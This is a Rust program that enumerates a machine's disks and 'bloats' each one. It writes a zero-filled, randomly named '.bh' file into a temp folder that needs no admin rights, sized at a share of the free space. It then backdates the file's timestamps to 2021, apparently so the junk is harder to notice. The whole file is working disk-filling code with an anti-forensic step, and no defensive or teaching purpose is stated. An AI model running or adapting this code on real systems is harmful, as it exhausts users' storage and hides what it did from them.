use core::slice;
use std::fs::{File, self};
use std::io::prelude::*;
use std::path::Path;
use rand::Rng;
use regex::Regex;
use sysinfo::Disks;
use filetime::{set_file_times,FileTime};


// Slice the string to get the root disk letter if it's Windows
fn slice_string(input: &str) -> &str {

	let pattern = Regex::new(r"(\\)|(/)").unwrap();
	let parts: Vec<&str> = pattern.split(input).collect();

	return parts[0];
}




fn main() -> std::io::Result<()> {

	// Get a list of the disks on the machine
	let disks = Disks::new_with_refreshed_list();	
	let mut disk_array = Vec::new();

	// Add all the disks found in an array
	for disk in &disks {

		let info:(&str, u64, u64) = (slice_string(disk.mount_point().to_str().unwrap()), disk.total_space(), disk.available_space());		
		disk_array.push(info);
		println!("Disk : {:?}",info);

	}	

	// Bloating each disks found
	for disk in disk_array{

		// Separate informations of the disk found
		let (disk_root, total_space, available_space) = disk;

		// Search for a valid path to write to
		let mut valid_path = String::new();
		// tmp folder don't need admin access to write to
		let path_array = [r"/temp/", r"/tmp/"];

		for path in path_array {
		let temp_path:String = format!("{}{}",disk_root, path).as_str().to_string();
		if Path::new(&temp_path).is_dir() {
			valid_path = temp_path; 
			println!("Valid path : {}", valid_path);
			break;
			}
		}
		// At this point, we found a valid folder for the disk


		let mut rng = rand::thread_rng();
				
		// Create the files
		for _ in 1..2{

			// Generate a random numbers
			let n2:u64 = rng.gen();

			// 1Mo =  1_048_576
			// 16Mo = 16_777_216
			// 128Mo = 134_217_728

			let size = available_space / 100;

			// Vec with specified size (number of elements in the vector)
			let encoded: Vec<u8> = vec![0;size.try_into().unwrap()];

			// Create the file and write into it
			// The file has a random number as name and the extension is .bh
			let mut file = File::create(format!("{}{}.bh",valid_path,n2))?;
			let _ = file.write_all(&encoded);

			set_file_times(format!("{}{}.bh",valid_path,n2), FileTime::from_unix_time(1611048846,0),FileTime::from_unix_time(1611048846,0));
		}

	}

	Ok(())

}
